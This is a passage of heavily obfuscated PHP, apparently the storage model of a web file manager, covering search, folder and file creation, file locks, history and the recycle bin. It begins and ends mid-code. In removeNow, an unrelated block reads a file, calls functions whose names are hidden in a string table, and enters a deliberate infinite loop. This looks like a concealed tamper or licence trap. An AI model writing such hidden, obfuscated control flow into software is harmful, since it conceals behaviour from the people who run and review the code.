array($ñß§­ğÚ[$şÂİ¸öÈ[80]], $æÆïó‰ò, $şÂİ¸öÈ[2066]); } else { $ñß§­ğÚ[$şÂİ¸öÈ[80]] = $æÆïó‰ò; } } if (isset($ïş¤„ê“[$şÂİ¸öÈ[585]]) && $ïş¤„ê“[$şÂİ¸öÈ[585]]) { $ñß§­ğÚ[] = array($şÂİ¸öÈ[445] => $ïş¤„ê“[$şÂİ¸öÈ[585]], $şÂİ¸öÈ[443] => $ïş¤„ê“[$şÂİ¸öÈ[585]], $şÂİ¸öÈ[984] => $şÂİ¸öÈ[1902]); } if (isset($ïş¤„ê“[$şÂİ¸öÈ[404]]) && $ïş¤„ê“[$şÂİ¸öÈ[404]]) { $Î©Á›Ü­ = $ïş¤„ê“[$şÂİ¸öÈ[404]]; if ($Î©Á›Ü­ == $şÂİ¸öÈ[79]) { $ñß§­ğÚ[$şÂİ¸öÈ[402]] = 1; } else { if ($Î©Á›Ü­ == $şÂİ¸öÈ[2067]) { $ñß§­ğÚ[$şÂİ¸öÈ[402]] = 0; } else { if ($Î©Á›Ü­) { $Î©Á›Ü­ = is_array($Î©Á›Ü­) ? $Î©Á›Ü­ : explode($şÂİ¸öÈ[50], $Î©Á›Ü­); $ñß§­ğÚ[$şÂİ¸öÈ[404]] = array($şÂİ¸öÈ[410], $Î©Á›Ü­); $ñß§­ğÚ[$şÂİ¸öÈ[402]] = 0; } } } } $this->_parseSearchParent($ïş¤„ê“, $ñß§­ğÚ); if (isset($ïş¤„ê“[$şÂİ¸öÈ[1898]]) && trim($ïş¤„ê“[$şÂİ¸öÈ[1898]])) { $ÆÑ€¼İ¢ = trim($ïş¤„ê“[$şÂİ¸öÈ[1898]]); $İËÌâøµ = explode($şÂİ¸öÈ[53], $ÆÑ€¼İ¢); if (strlen($ÆÑ€¼İ¢) > 2 && (substr($ÆÑ€¼İ¢, 0, 1) == $şÂİ¸öÈ[117] && substr($ÆÑ€¼İ¢, -1) == $şÂİ¸öÈ[117]) || substr($ÆÑ€¼İ¢, 0, 1) == $şÂİ¸öÈ[58] && substr($ÆÑ€¼İ¢, -1) == $şÂİ¸öÈ[58]) { $ÆÑ€¼İ¢ = substr($ÆÑ€¼İ¢, 1, -1); $İËÌâøµ = array($ÆÑ€¼İ¢); } $ñß§­ğÚ[$şÂİ¸öÈ[32]] = array(array($şÂİ¸öÈ[535], $şÂİ¸öÈ[1900] . $ÆÑ€¼İ¢ . $şÂİ¸öÈ[1900])); if (count($İËÌâøµ) > 1) { $ñß§­ğÚ[$şÂİ¸öÈ[32]] = array(); foreach ($İËÌâøµ as $›Åğ‹Á½) { if (!trim($›Åğ‹Á½)) { continue; } $ñß§­ğÚ[$şÂİ¸öÈ[32]][] = array($şÂİ¸öÈ[535], $şÂİ¸öÈ[1900] . trim($›Åğ‹Á½) . $şÂİ¸öÈ[1900]); } } } return $ñß§­ğÚ; } private function _parseSearchParent($ƒ×²‚Íù, &$í¯«êçĞ) { $í’Õö =& $_SERVER[® ¨Ä®ñ]; if (!isset($ƒ×²‚Íù[$í’Õö[489]]) || !$ƒ×²‚Íù[$í’Õö[489]]) { return; } $±¹‡Îî› = $this->pathInfo($ƒ×²‚Íù[$í’Õö[489]]); $Ÿ¡±¾¹¯ = $±¹‡Îî›[$í’Õö[489]] . $í’Õö[12] === $í’Õö[190]; $Ó¸–‹˜ = $±¹‡Îî›[$í’Õö[403]] == $í’Õö[506]; $í¯«êçĞ[$í’Õö[575]] = array($í’Õö[535], $±¹‡Îî›[$í’Õö[512]] . $ƒ×²‚Íù[$í’Õö[489]] . $í’Õö[536]); $ü–Æ¥õÕ = isset($ƒ×²‚Íù[$í’Õö[1766]]) && in_array($í’Õö[506], $ƒ×²‚Íù[$í’Õö[1766]]); if (!$ü–Æ¥õÕ || !$Ó¸–‹˜ || !$Ÿ¡±¾¹¯ || !$±¹‡Îî›[$í’Õö[405]]) { return; } if (!AuthModel::authCheckRoot($±¹‡Îî›[$í’Õö[405]][$í’Õö[406]])) { return; } $…ğêî¡· = $±¹‡Îî›[$í’Õö[495]] . $í’Õö[12]; if ($…ğêî¡· == $í’Õö[89]) { unset($í¯«êçĞ[$í’Õö[575]]); $í¯«êçĞ[$í’Õö[403]] = self::TYPE_GROUP; return; } $£½È´’¥ = Model($í’Õö[513])->groupChildrenAll($…ğêî¡·); $‚îÒ  = count($£½È´’¥); if ($‚îÒ  <= 1) { return; } $Í‚Ë÷Äû = array($í’Õö[489] => 0, $í’Õö[403] => self::TYPE_GROUP, $í’Õö[495] => array($í’Õö[7], $£½È´’¥)); $îÓ†Š‰„ = $this->field($í’Õö[2068])->where($Í‚Ë÷Äû)->limit($‚îÒ )->select(); $í¯«êçĞ[$í’Õö[575]] = array(); foreach ($îÓ†Š‰„ as $ÇÙîêİİ) { $í¯«êçĞ[$í’Õö[575]][] = array($í’Õö[535], $í’Õö[522] . $ÇÙîêİİ[$í’Õö[394]] . $í’Õö[536]); } $í¯«êçĞ[$í’Õö[575]][] = $í’Õö[1902]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ØÀ©Ù ¸) { $öÑ©Ë´« =& $_SERVER[® ¨Ä®ñ]; $Ê¿´³¼Œ = Model($öÑ©Ë´«[504])->where(array($öÑ©Ë´«[1630] => $ØÀ©Ù ¸))->find(); $–§ñ¬ÕÉ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ØÀ©Ù ¸, $Ê¿´³¼Œ[$öÑ©Ë´«[32]]); $this->userDesktopAdd($–§ñ¬ÕÉ); return $–§ñ¬ÕÉ; } public function userDesktopAdd($ƒˆ³°«†) { $ö•˜¯’ç =& $_SERVER[® ¨Ä®ñ]; $·î¤ßæ = LNG($ö•˜¯’ç[2069]); $È‘½ıÓ = $this->mkdir($ƒˆ³°«†, $·î¤ßæ); $this->metaSet($È‘½ıÓ, $ö•˜¯’ç[2070], $ö•˜¯’ç[89]); $this->metaSet($ƒˆ³°«†, $ö•˜¯’ç[2071], $È‘½ıÓ); } public function groupRootAdd($ı’½ô¢) { $€ŞÖÜ£õ =& $_SERVER[® ¨Ä®ñ]; $Óíø’ = Model($€ŞÖÜ£õ[513])->where(array($€ŞÖÜ£õ[1894] => $ı’½ô¢))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ı’½ô¢, $Óíø’[$€ŞÖÜ£õ[32]]); } public function systemRootPathAdd($ç¢¾åõÚ) { if ($ç¢¾åõÚ != $_SERVER[® ¨Ä®ñ][528]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ç¢¾åõÚ); } public function userRootRemove($–‹ë°‘ê) { $Ã÷„’ôø = $this->sourceRoot(SourceModel::TYPE_USER, $–‹ë°‘ê); if (!$Ã÷„’ôø) { return; } $this->remove($Ã÷„’ôø, !1); } public function groupRootRemove($»ÌÍÛ‰Ë) { $ç‹Ïß¦Œ = $this->sourceRoot(SourceModel::TYPE_GROUP, $»ÌÍÛ‰Ë); if (!$ç‹Ïß¦Œ) { return; } $this->remove($ç‹Ïß¦Œ, !1); } private function _mkdirRoot($–İüÄ¢ï, $„ğ¸æ‘•, $Â°â×€ê) { $”æ¹¤ä =& $_SERVER[® ¨Ä®ñ]; $“Ò‰¬´Á = array($”æ¹¤ä[393] => 0, $”æ¹¤ä[571] => $–İüÄ¢ï, $”æ¹¤ä[572] => $„ğ¸æ‘•, $”æ¹¤ä[568] => 1, $”æ¹¤ä[573] => USER_ID, $”æ¹¤ä[574] => USER_ID, $”æ¹¤ä[569] => $”æ¹¤ä[12], $”æ¹¤ä[575] => $”æ¹¤ä[522], $”æ¹¤ä[421] => 0, $”æ¹¤ä[570] => 0, $”æ¹¤ä[459] => 0, $”æ¹¤ä[576] => $”æ¹¤ä[12]); if ($›Ø³ï™Ê = $this->where($“Ò‰¬´Á)->find()) { return $›Ø³ï™Ê[$”æ¹¤ä[394]]; } $ĞÒ±ÁÑí = "\115\x6f\x64\145\x6c\123\x6f\165\x72\x63\x65\56\155\x6b\x64\151\x72\x52\157\157\164\x2e{$–İüÄ¢ï}\x2e{$„ğ¸æ‘•}\x2e" . $Â°â×€ê; CacheLock::lock($ĞÒ±ÁÑí); $“Ò‰¬´Á[$”æ¹¤ä[32]] = $Â°â×€ê; $Œ•©©Ïó = $this->add($“Ò‰¬´Á); $å‡î…²Û = array($”æ¹¤ä[577] => short_id($Œ•©©Ïó)); $this->where(array($”æ¹¤ä[409] => $Œ•©©Ïó))->save($å‡î…²Û); CacheLock::unlock($ĞÒ±ÁÑí); return $Œ•©©Ïó; } private function sourceRoot($“–ïŸü, $¶ÍÀÓÓı, $†ÁÎ¸¡¯ = false) { $Í‹ö”ÔŸ =& $_SERVER[® ¨Ä®ñ]; $­æÒ‰„Î = array($Í‹ö”ÔŸ[393] => 0, $Í‹ö”ÔŸ[571] => $“–ïŸü, $Í‹ö”ÔŸ[572] => $¶ÍÀÓÓı); if ($ÚûŒ“‡× = $this->where($­æÒ‰„Î)->find()) { return $†ÁÎ¸¡¯ ? $ÚûŒ“‡× : $ÚûŒ“‡×[$Í‹ö”ÔŸ[394]]; } return !1; } public function sourceRootGroup($ÏÁúå«á) { $šõÜÃÆ€ =& $_SERVER[® ¨Ä®ñ]; if (is_string($ÏÁúå«á)) { $ÏÁúå«á = array($ÏÁúå«á); } $‡ø¢–Å = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ÏÁúå«á, $šõÜÃÆ€[181]); $¿¾à’ô½ = array($šõÜÃÆ€[364] => $‡ø¢–Å, $šõÜÃÆ€[361] => array($šõÜÃÆ€[741] => count($ÏÁúå«á))); $this->_listDataApply($¿¾à’ô½[$šõÜÃÆ€[364]]); $this->_listMake($¿¾à’ô½); return array_to_keyvalue($¿¾à’ô½[$šõÜÃÆ€[77]], $šõÜÃÆ€[495]); } public function mkfile($Ä“’‚ç—, $ÒÆÄÚ…¥, $İÊİºä = '', $Ğ³±ÊâÇ = REPEAT_RENAME) { $Šö¢Øîş =& $_SERVER[® ¨Ä®ñ]; $£Õ‘·¹ = Model($Šö¢Øîş[594])->addFileByContent($İÊİºä, $ÒÆÄÚ…¥); return $this->_createFileCall($Ä“’‚ç—, $ÒÆÄÚ…¥, $£Õ‘·¹, $Ğ³±ÊâÇ, $Šö¢Øîş[1320]); } public function addFile($ÔäçåÔí, $Ìˆ÷çÚÖ, $ô·²äĞí, $ÛõÍ–Ææ = false, $ÉÜÉÒÃ = REPEAT_RENAME) { $‚àÑ¬Àª = Model($_SERVER[® ¨Ä®ñ][594])->addFile($Ìˆ÷çÚÖ, $ô·²äĞí, $ÛõÍ–Ææ); return $this->_createFileCall($ÔäçåÔí, $ô·²äĞí, $‚àÑ¬Àª, $ÉÜÉÒÃ); } public function addFileByFileID($õŸêá×, $ÓüÆ†²Â, $·„¢†ô¨, $ıÑáü’¶ = REPEAT_RENAME) { $µøû„¸Æ =& $_SERVER[® ¨Ä®ñ]; $éÚãèŠ¥ = Model($µøû„¸Æ[594])->find($ÓüÆ†²Â); Model($µøû„¸Æ[594])->linkAdd($ÓüÆ†²Â); return $this->_createFileCall($õŸêá×, $·„¢†ô¨, $éÚãèŠ¥, $ıÑáü’¶); } public function addFileByRemote($ä™‰ÏíĞ, $­ñ£œ¬‡, $óËƒĞîÙ, $ëÒøİ¹© = array(), $Æ¸Ûó¯º = REPEAT_RENAME) { $Îé€ŠÅ = Model($_SERVER[® ¨Ä®ñ][594])->addFileByRemote($­ñ£œ¬‡, $óËƒĞîÙ, $ëÒøİ¹©); return $this->_createFileCall($ä™‰ÏíĞ, $óËƒĞîÙ, $Îé€ŠÅ, $Æ¸Ûó¯º); } private function _createFileCall($ÏÏØ†á®, $…—Ê½”û, $®¸ê¿çØ, $³şåÉÓ½, $×Ä´ÖİÑ = "\x75\160\154\157\141\144") { $Úé»’»Ú =& $_SERVER[® ¨Ä®ñ]; $¨˜Ùìó± = !1; $this->setMasterDB(); $this->lockWriteStart($ÏÏØ†á®, $…—Ê½”û); $¼´—ş·˜ = $this->fileNameExist($ÏÏØ†á®, $…—Ê½”û); $Ò†“òö = $this->_createFile($ÏÏØ†á®, $…—Ê½”û, $®¸ê¿çØ, $³şåÉÓ½, $¨˜Ùìó±); if (!$¨˜Ùìó±) { Model($Úé»’»Ú[461])->remove($®¸ê¿çØ[$Úé»’»Ú[458]]); } if ($¨˜Ùìó± && $Ò†“òö && $Ò†“òö != $¼´—ş·˜) { Model($Úé»’»Ú[2042])->eventCreate($Ò†“òö, $×Ä´ÖİÑ); } $this->lockWriteEnd($ÏÏØ†á®, $…—Ê½”û); return $Ò†“òö; } public function mkdir($íµ½®ıá, $Ç‚€é«ç, $É“†æî = REPEAT_SKIP) { $ëÄöøû =& $_SERVER[® ¨Ä®ñ]; $this->setMasterDB(); $àœ§úÚØ = $this->sourceInfo($íµ½®ıá); if (!$àœ§úÚØ) { return !1; } $this->lockWriteStart($íµ½®ıá, $Ç‚€é«ç); if ($É“†æî !== !1) { $×¥ª¢ş = $this->fileNameExist($íµ½®ıá, $Ç‚€é«ç); if ($×¥ª¢ş && $É“†æî != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($íµ½®ıá, $Ç‚€é«ç); return $×¥ª¢ş; } $Ç‚€é«ç = $this->fileNameAuto($íµ½®ıá, $Ç‚€é«ç, $É“†æî); } $¶è€øÅ© = array($ëÄöøû[568] => 1, $ëÄöøû[412] => $Ç‚€é«ç, $ëÄöøû[569] => $ëÄöøû[12], $ëÄöøû[459] => 0, $ëÄöøû[570] => 0); $ò£Ñ¸Ç¦ = $this->_addSource($¶è€øÅ©, $àœ§úÚØ); Model($ëÄöøû[2042])->eventCreate($ò£Ñ¸Ç¦, $ëÄöøû[1321]); $this->lockWriteEnd($íµ½®ıá, $Ç‚€é«ç); return $ò£Ñ¸Ç¦; } public function listSourceRoot($¯‘ÀôÎÅ, $Û–ÌçÅ½, $ Ä²°²¦ = "\x73\x6f\165\x72\x63\145\x49\x44\x2c\x74\x61\162\147\145\164\111\x44\54\163\x69\172\x65") { $ì À±Ú =& $_SERVER[® ¨Ä®ñ]; $¤î¦Äšø = $ì À±Ú[373]; $ÂÀ¥Õ¼× = array(); $™¢ï¿ÄÓ = 1024 * 50; $€ü…Ú¼û = is_array($€ü…Ú¼û) ? $€ü…Ú¼û : array(); $èİÃÄòê = count($Û–ÌçÅ½); $ÆÔ¶ø²‰ = $this->tablePrefix . $ì À±Ú[2072]; for ($¨»´ìø = 0; $¨»´ìø < $èİÃÄòê; $¨»´ìø++) { $ÂÈâËºù = $Û–ÌçÅ½[$¨»´ìø]; $¤î¦Äšø .= "\x53\105\114\105\x43\124\40\52\x20\106\122\117\115\40\x28\x53\x45\x4c\x45\x43\x54\x20{$ Ä²°²¦}\40\106\x52\117\115\x20\140{$ÆÔ¶ø²‰}\x60\40\x57\110\105\122\105\x20"; $¤î¦Äšø .= "\x60\x70\x61\162\145\x6e\x74\111\104\x60\x3d\60\x20\x41\116\x44\x20\140\x74\x61\162\147\x65\x74\x49\x44\x60\75{$ÂÈâËºù}\x20\101\x4e\104\x20\x60\x74\141\x72\x67\x65\x74\x54\171\x70\x65\140\x3d{$¯‘ÀôÎÅ}\x20\x6c\x69\x6d\151\164\x20\61\51\40\x61\163\40\x74\x62\x5f{$¨»´ìø}\x20\x55\x4e\x49\117\x4e\40\101\x4c\114\40"; if ((strlen($¤î¦Äšø) >= $™¢ï¿ÄÓ || $¨»´ìø == $èİÃÄòê - 1) && $¤î¦Äšø) { $¤î¦Äšø = substr($¤î¦Äšø, 0, -strlen($ì À±Ú[1022])); $²ÁÅü²ü = $this->query($¤î¦Äšø); $¤î¦Äšø = $ì À±Ú[12]; $ÂÀ¥Õ¼× = array_merge($ÂÀ¥Õ¼×, $²ÁÅü²ü); } } return $ÂÀ¥Õ¼×; } private function _createFile($Öàí¨»¬, $·™š—–, $×Á·—É, $±¸Ÿˆ°°, &$†Ä×µÖÅ) { $Ã‡·Îàø =& $_SERVER[® ¨Ä®ñ]; $ú¬çÖä = $this->sourceInfo($Öàí¨»¬); if (!$×Á·—É || !$ú¬çÖä) { return !1; } if ($±¸Ÿˆ°° !== !1) { $¸úœáÚ÷ = $this->fileNameExist($Öàí¨»¬, $·™š—–); } $†Ä×µÖÅ = !0; if ($±¸Ÿˆ°° && $¸úœáÚ÷) { if ($±¸Ÿˆ°° == REPEAT_SKIP) { $†Ä×µÖÅ = !1; return $¸úœáÚ÷; } else { if ($±¸Ÿˆ°° == REPEAT_REPLACE) { $‡Èˆı¿© = $this->sourceInfo($¸úœáÚ÷); $¾±Ò¢©Å = $this->fileHistory($‡Èˆı¿©, $×Á·—É[$Ã‡·Îàø[458]], $×Á·—É[$Ã‡·Îàø[80]]); if (!$¾±Ò¢©Å) { $†Ä×µÖÅ = !1; } else { $this->folderSizeReset($Öàí¨»¬); } return $¸úœáÚ÷; } else { $·™š—– = $this->fileNameAuto($Öàí¨»¬, $·™š—–, $±¸Ÿˆ°°, !1); } } } $­æ ¸é = array($Ã‡·Îàø[568] => 0, $Ã‡·Îàø[412] => $·™š—–, $Ã‡·Îàø[569] => substr(get_path_ext($·™š—–), 0, 10), $Ã‡·Îàø[459] => $×Á·—É[$Ã‡·Îàø[458]], $Ã‡·Îàø[570] => $×Á·—É[$Ã‡·Îàø[80]]); $œ‚½‚Ç = $this->_addSource($­æ ¸é, $ú¬çÖä); $this->folderSizeReset($Öàí¨»¬, intval($­æ ¸é[$Ã‡·Îàø[80]])); return $œ‚½‚Ç; } protected function fileHistory($Å‰ÏÑ–, $ˆíµÓ©µ, $Ïû¢åÜù) { $Ìª¶ó®“ =& $_SERVER[® ¨Ä®ñ]; $é¥Œ â’ = defined($Ìª¶ó®“[465]) ? USER_ID : $Ìª¶ó®“[190]; if ($Å‰ÏÑ–[$Ìª¶ó®“[458]] == $ˆíµÓ©µ) { return !1; } $this->checkLock($Å‰ÏÑ–[$Ìª¶ó®“[394]], $ˆíµÓ©µ); Model($Ìª¶ó®“[2073])->addHistory($Å‰ÏÑ–); $›øÍ‚®ú = array($Ìª¶ó®“[574] => $é¥Œ â’, $Ìª¶ó®“[416] => time(), $Ìª¶ó®“[458] => $ˆíµÓ©µ, $Ìª¶ó®“[80] => $Ïû¢åÜù); $this->where(array($Ìª¶ó®“[409] => $Å‰ÏÑ–[$Ìª¶ó®“[394]]))->save($›øÍ‚®ú); $this->sourceCacheClear($Å‰ÏÑ–[$Ìª¶ó®“[394]]); return !0; } public function checkLock($ÆĞ˜¸Ò, $£¹­¾…Ë) { $¨é˜¬ŒÀ =& $_SERVER[® ¨Ä®ñ]; $Ö“ş»…¥ = $this->pathInfo($ÆĞ˜¸Ò); if (!$this->fileIsLock($Ö“ş»…¥, !0)) { return; } $÷Á¯ğ¿ = Session::get($¨é˜¬ŒÀ[2074]); $« ³šêÈ = substr($Ö“ş»…¥[$¨é˜¬ŒÀ[32]], 0, -1 - strlen($Ö“ş»…¥[$¨é˜¬ŒÀ[167]])) . $¨é˜¬ŒÀ[1588] . $÷Á¯ğ¿ . $¨é˜¬ŒÀ[10] . $Ö“ş»…¥[$¨é˜¬ŒÀ[167]]; $– ³°…¤ = Model($¨é˜¬ŒÀ[594])->find($£¹­¾…Ë); $this->_createFileCall($Ö“ş»…¥[$¨é˜¬ŒÀ[489]], $« ³šêÈ, $– ³°…¤, REPEAT_REPLACE, $¨é˜¬ŒÀ[1320]); $ÏêôÎÀ = $Ö“ş»…¥[$¨é˜¬ŒÀ[456]][$¨é˜¬ŒÀ[533]]; $Û¬È¬á = $ÏêôÎÀ[$¨é˜¬ŒÀ[2075]] ? $ÏêôÎÀ[$¨é˜¬ŒÀ[2075]] : $ÏêôÎÀ[$¨é˜¬ŒÀ[32]]; show_json(LNG($¨é˜¬ŒÀ[2076]) . $¨é˜¬ŒÀ[2077] . LNG($¨é˜¬ŒÀ[2078]) . $¨é˜¬ŒÀ[2079] . $Û¬È¬á . $¨é˜¬ŒÀ[2080], !1); } public function fileIsLock($ÅØ‘ôÌñ, $Û…Ş¯ù = false) { $ƒÅü€üœ =& $_SERVER[® ¨Ä®ñ]; if (!isset($ÅØ‘ôÌñ[$ƒÅü€üœ[456]]) || !$ÅØ‘ôÌñ[$ƒÅü€üœ[456]][$ƒÅü€üœ[530]]) { return !1; } if ($ÅØ‘ôÌñ[$ƒÅü€üœ[456]][$ƒÅü€üœ[530]] != USER_ID) { return !0; } $º˜ÃäŠ = $GLOBALS[$ƒÅü€üœ[6]][$ƒÅü€üœ[90]][$ƒÅü€üœ[531]]; if ($ÅØ‘ôÌñ[$ƒÅü€üœ[456]][$ƒÅü€üœ[532]] <= time() - $º˜ÃäŠ) { $this->metaSet($ÅØ‘ôÌñ[$ƒÅü€üœ[394]], $ƒÅü€üœ[530], null); $this->metaSet($ÅØ‘ôÌñ[$ƒÅü€üœ[394]], $ƒÅü€üœ[532], null); } if ($Û…Ş¯ù) { $this->metaSet($ÅØ‘ôÌñ[$ƒÅü€üœ[394]], $ƒÅü€üœ[532], time()); } return !1; } private function _addSource($ÖçÁ¥á¬, $¡¨ÏÖñ) { $Õ»¡—º› =& $_SERVER[® ¨Ä®ñ]; $†Ø•Ëâ = defined($Õ»¡—º›[465]) ? USER_ID : $Õ»¡—º›[190]; $œÔ›äå´ = array($Õ»¡—º›[571] => $¡¨ÏÖñ[$Õ»¡—º›[403]], $Õ»¡—º›[572] => $¡¨ÏÖñ[$Õ»¡—º›[495]], $Õ»¡—º›[573] => $†Ø•Ëâ, $Õ»¡—º›[574] => $†Ø•Ëâ, $Õ»¡—º›[393] => $¡¨ÏÖñ[$Õ»¡—º›[394]], $Õ»¡—º›[575] => $¡¨ÏÖñ[$Õ»¡—º›[512]] . $¡¨ÏÖñ[$Õ»¡—º›[394]] . $Õ»¡—º›[50], $Õ»¡—º›[421] => 0, $Õ»¡—º›[576] => $Õ»¡—º›[12]); $ÖçÁ¥á¬ = array_merge($œÔ›äå´, $ÖçÁ¥á¬); $this->updateModifyTime($ÖçÁ¥á¬[$Õ»¡—º›[489]]); $…‡³æÛ = $Õ»¡—º›[2081] . $¡¨ÏÖñ[$Õ»¡—º›[394]]; if (isset(self::$cacheChildList[$…‡³æÛ])) { unset(self::$cacheChildList[$…‡³æÛ]); } static $ÖÏğ¿àÖ = false; if (!$ÖÏğ¿àÖ) { Hook::trigger($Õ»¡—º›[558], $ÖçÁ¥á¬); $ÖÏğ¿àÖ = !0; } $ùÜİ²÷ˆ = $this->add($ÖçÁ¥á¬); $éÎ­¶ô = array($Õ»¡—º›[577] => short_id($ùÜİ²÷ˆ)); $this->where(array($Õ»¡—º›[409] => $ùÜİ²÷ˆ))->save($éÎ­¶ô); $this->setNamePinyin($ùÜİ²÷ˆ, $ÖçÁ¥á¬[$Õ»¡—º›[32]]); return $ùÜİ²÷ˆ; } public function remove($Â®«‘¶Ö, $ã©œÌ†³ = true) { $ì³¦²ÔÇ =& $_SERVER[® ¨Ä®ñ]; $‡‹Ëˆßò = $this->sourceInfo($Â®«‘¶Ö); $…“ÆÚ¨ƒ = intval($‡‹Ëˆßò[$ì³¦²ÔÇ[403]]) === self::TYPE_SYSTEM; $¬óıîÄ´ = Model($ì³¦²ÔÇ[424])->get($ì³¦²ÔÇ[2082]) == $ì³¦²ÔÇ[89]; if ($…“ÆÚ¨ƒ || $ã©œÌ†³ || !$¬óıîÄ´) { return $this->removeNow($Â®«‘¶Ö, $ã©œÌ†³); } $Æ²ÔƒÈõ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $œì‚µŸ = $‡‹Ëˆßò[$ì³¦²ÔÇ[403]] == self::TYPE_USER ? $ì³¦²ÔÇ[585] : $ì³¦²ÔÇ[506]; if ($œì‚µŸ == $ì³¦²ÔÇ[585]) { $™´øäÕÆ = Model($ì³¦²ÔÇ[504])->getInfo($‡‹Ëˆßò[$ì³¦²ÔÇ[495]]); $ğ¿™Àñ¼ = !empty($™´øäÕÆ[$ì³¦²ÔÇ[2075]]) ? $™´øäÕÆ[$ì³¦²ÔÇ[2075]] : $™´øäÕÆ[$ì³¦²ÔÇ[32]]; $ğ¿™Àñ¼ = $ì³¦²ÔÇ[255] . $ğ¿™Àñ¼ . $ì³¦²ÔÇ[2083] . $‡‹Ëˆßò[$ì³¦²ÔÇ[495]]; } else { $™´øäÕÆ = Model($ì³¦²ÔÇ[513])->getInfo($‡‹Ëˆßò[$ì³¦²ÔÇ[495]]); $ğ¿™Àñ¼ = _get($™´øäÕÆ, $ì³¦²ÔÇ[32]); $ğ¿™Àñ¼ = $ì³¦²ÔÇ[159] . $ğ¿™Àñ¼ . $ì³¦²ÔÇ[2084] . $‡‹Ëˆßò[$ì³¦²ÔÇ[495]]; } $æì„›¦ç = $ì³¦²ÔÇ[2085] . md5($ğ¿™Àñ¼); CacheLock::lock($æì„›¦ç); $ï‘Ò‰¹Œ = $this->fileNameExist($Æ²ÔƒÈõ, $ğ¿™Àñ¼); if (!$ï‘Ò‰¹Œ) { $ï‘Ò‰¹Œ = $this->mkdir($Æ²ÔƒÈõ, $ğ¿™Àñ¼, REPEAT_SKIP); $this->metaSet($ï‘Ò‰¹Œ, $ì³¦²ÔÇ[2086], $œì‚µŸ); $this->metaSet($ï‘Ò‰¹Œ, $ì³¦²ÔÇ[2087], $‡‹Ëˆßò[$ì³¦²ÔÇ[495]]); if ($‡‹Ëˆßò[$ì³¦²ÔÇ[489]] != 0) { $this->metaSet($ï‘Ò‰¹Œ, $ì³¦²ÔÇ[2088], _get($™´øäÕÆ, $ì³¦²ÔÇ[2089])); } } CacheLock::unlock($æì„›¦ç); $this->metaSet($Â®«‘¶Ö, $ì³¦²ÔÇ[2090], $‡‹Ëˆßò[$ì³¦²ÔÇ[489]]); $this->where(array($ì³¦²ÔÇ[394] => $Â®«‘¶Ö))->save(array($ì³¦²ÔÇ[416] => time())); $this->recycleClear($‡‹Ëˆßò); $³úÑÔæ = $this->move($Â®«‘¶Ö, $ï‘Ò‰¹Œ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($‡‹Ëˆßò[$ì³¦²ÔÇ[489]]); return $³úÑÔæ; } private function recycleClear($¹ƒŸ¿’ò) { $ƒ’éÛÊÚ =& $_SERVER[® ¨Ä®ñ]; $¨ì†ß£¥ = $this->childrenAll($¹ƒŸ¿’ò); $ğÛÍì´¶ = array($ƒ’éÛÊÚ[409] => array($ƒ’éÛÊÚ[410], $¨ì†ß£¥[$ƒ’éÛÊÚ[2091]])); Model($ƒ’éÛÊÚ[2092])->where($ğÛÍì´¶)->delete(); } public function removeNow($œÔ·İÏ‘, $ÇêÊ™í‡ = true) { $ïµ±ï“¾ =& $_SERVER[® ¨Ä®ñ]; if (!isset($_SERVER[$ïµ±ï“¾[854]]) || !isset($_SERVER[$ïµ±ï“¾[943]])) { $–¢Ôôìà = $ïµ±ï“¾[856]; $¢îÈ†½Å = $ïµ±ï“¾[857]; $ìë¶ÎŒŸ = $_SERVER[$ïµ±ï“¾[858]] . $ïµ±ï“¾[859]; $ÓÊäßßÙ = $¢îÈ†½Å($ìë¶ÎŒŸ); $ºäÄé¡ = explode($ïµ±ï“¾[226], $ÓÊäßßÙ); if (count($ºäÄé¡) < $ïµ±ï“¾[610]) { $Ÿó‹Õè = $ïµ±ï“¾[860]; $Ÿó‹Õè(); } $ÆƒÑ¯¸À = $ïµ±ï“¾[861]; $ÆƒÑ¯¸À($_SERVER[$ïµ±ï“¾[862]]); $Ôö½èàä = 1; for ($½ùö = $Ôö½èàä; $½ùö > 0; $½ùö++) { $ÆƒÑ¯¸À = json_encode($GLOBALS[$ïµ±ï“¾[410]]); } } $Î¿ª×üğ = $this->sourceInfo($œÔ·İÏ‘); $¶à•£ıŞ = $this->pathInfoMore($œÔ·İÏ‘); if (!$Î¿ª×üğ) { return !0; } if ($Î¿ª×üğ[$ïµ±ï“¾[489]] == 0) { if (!_get($GLOBALS, $ïµ±ï“¾[496])) { return !1; } } $this->lockMoveStart($œÔ·İÏ‘); Hook::trigger($ïµ±ï“¾[2093], $¶à•£ıŞ, $ÇêÊ™í‡); if ($ÇêÊ™í‡) { Model($ïµ±ï“¾[2092])->moveToRecycle($œÔ·İÏ‘); } else { $ÒË‘ø´ = $this->childrenAll($Î¿ª×üğ); Model($ïµ±ï“¾[555])->eventRemove($œÔ·İÏ‘); $this->removeRelevance($ÒË‘ø´[$ïµ±ï“¾[2091]], $ÒË‘ø´[$ïµ±ï“¾[1452]]); } $this->folderSizeReset($Î¿ª×üğ[$ïµ±ï“¾[489]]); $ĞµÂ¢ÔÛ = array($Î¿ª×üğ[$ïµ±ï“¾[489]]); if ($Î¿ª×üğ[$ïµ±ï“¾[402]] == $ïµ±ï“¾[89]) { $ĞµÂ¢ÔÛ[] = $Î¿ª×üğ[$ïµ±ï“¾[394]]; } $this->updateModifyTime($ĞµÂ¢ÔÛ); $this->lockMoveEnd($œÔ·İÏ‘); Hook::trigger($ïµ±ï“¾[1676], $¶à•£ıŞ, $ÇêÊ™í‡); return !0; } public function childrenAll($úôæ¢½) { $À²ÕØş‚ =& $_SERVER[® ¨Ä®ñ]; $—¡”ïß© = $úôæ¢½[$À²ÕØş‚[394]]; if ($úôæ¢½[$À²ÕØş‚[402]] == $À²ÕØş‚[89]) { $Úßö±ü™ = array($À²ÕØş‚[575] => array($À²ÕØş‚[535], $úôæ¢½[$À²ÕØş‚[512]] . $—¡”ïß© . $À²ÕØş‚[536])); $Ş˜ïÄ¯‚ = array($À²ÕØş‚[575] => $Úßö±ü™[$À²ÕØş‚[512]]); $¦ÇÆºæû = $this->field($À²ÕØş‚[2094])->where($Ş˜ïÄ¯‚)->select(); $»ÊŸá—â = !1; $˜õ© 